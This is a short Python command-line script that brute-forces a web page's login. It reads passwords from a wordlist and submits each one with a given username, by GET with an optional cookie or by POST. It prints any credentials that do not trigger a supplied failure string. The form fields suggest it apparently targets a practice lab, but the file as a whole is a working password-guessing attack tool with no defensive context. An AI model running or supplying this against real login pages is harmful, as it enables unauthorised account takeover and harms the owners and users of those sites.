import argparse
import requests

parser = argparse.ArgumentParser(description='Brute force login for a web page', add_help=False)
parser.add_argument('url', type=str, help='URL of the login page')
parser.add_argument('username', type=str, help='username to brute force')
parser.add_argument('pass_file', type=str, help='path to password file to use')
parser.add_argument('login_failed', type=str, help='string that occurs when the login fails')
parser.add_argument('--cookie', type=str, help='cookie value (optional)')
parser.add_argument('--help', action='help', help='show this help message and exit')
args = parser.parse_args()

def cracking(url, username, password):
        print('- Trying: ', password)

        if args.cookie:
            response = requests.get(url, params={'username':username, 'password':password, 'Login':'Login'}, cookies = {'Cookie':args.cookie})
        else:
            response = requests.post(url, data= {'username':username, 'password':password, 'Login':'Login'} ) 

        if args.login_failed in response.content.decode():
            pass
        else:
            print('Found username: ==> ', username)
            print('Found password: ==> ', password)


with open(args.pass_file, 'r') as passwords:
    for password in passwords:
        cracking(args.url, args.username, password.strip())